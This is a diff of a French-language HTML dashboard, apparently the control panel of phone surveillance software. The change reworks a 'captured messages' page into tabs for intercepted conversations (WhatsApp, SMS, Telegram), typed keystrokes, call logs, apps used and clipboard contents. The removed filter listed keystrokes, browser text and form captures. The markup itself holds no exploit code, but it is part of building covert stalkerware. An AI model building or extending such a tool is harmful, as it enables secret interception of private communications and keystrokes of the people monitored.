@@ -170,21 +170,46 @@
 
       <!-- MESSAGES / NOTIFICATIONS -->
       <section class="page" id="page-messages">
-        <div class="page-header"><h1>Messages capturés</h1>
+        <div class="page-header">
+          <h1>Activite detaillee</h1>
           <div class="filters-inline">
             <select id="messages-device-filter"><option value="">Tous les appareils</option></select>
-            <select id="messages-type-filter">
-              <option value="">Tous les types</option>
-              <option value="notification_message">Notifications (WhatsApp, SMS...)</option>
-              <option value="keystroke">Texte tapé</option>
-              <option value="clipboard">Presse-papiers</option>
-              <option value="chrome_text">Chrome texte</option>
-              <option value="safari_text">Safari texte</option>
-              <option value="chrome_form">Chrome formulaire</option>
-            </select>
           </div>
         </div>
-        <div id="messages-list" class="panel-body scrollable-full"><p class="empty">Chargement…</p></div>
+
+        <!-- Onglets -->
+        <div class="msg-tabs" id="msg-tabs">
+          <button class="msg-tab active" data-tab="conversations" onclick="switchMsgTab('conversations')">Conversations</button>
+          <button class="msg-tab" data-tab="typed" onclick="switchMsgTab('typed')">Texte tape</button>
+          <button class="msg-tab" data-tab="calls" onclick="switchMsgTab('calls')">Appels</button>
+          <button class="msg-tab" data-tab="apps" onclick="switchMsgTab('apps')">Applications</button>
+          <button class="msg-tab" data-tab="clipboard" onclick="switchMsgTab('clipboard')">Presse-papiers</button>
+        </div>
+
+        <!-- Conversations (WhatsApp, SMS, Telegram...) -->
+        <div class="msg-panel active" id="msg-conversations">
+          <div id="conversations-list"><p class="empty">Aucune conversation captee.</p></div>
+        </div>
+
+        <!-- Texte tape au clavier -->
+        <div class="msg-panel" id="msg-typed">
+          <div id="typed-list"><p class="empty">Aucun texte capture.</p></div>
+        </div>
+
+        <!-- Journal d'appels -->
+        <div class="msg-panel" id="msg-calls">
+          <div id="calls-list"><p class="empty">Aucun appel.</p></div>
+        </div>
+
+        <!-- Applications utilisees -->
+        <div class="msg-panel" id="msg-apps">
+          <div id="apps-list"><p class="empty">Aucune app.</p></div>
+        </div>
+
+        <!-- Presse-papiers -->
+        <div class="msg-panel" id="msg-clipboard">
+          <div id="clipboard-list"><p class="empty">Aucun contenu.</p></div>
+        </div>
       </section>
 
       <!-- MOTS-CLÉS -->
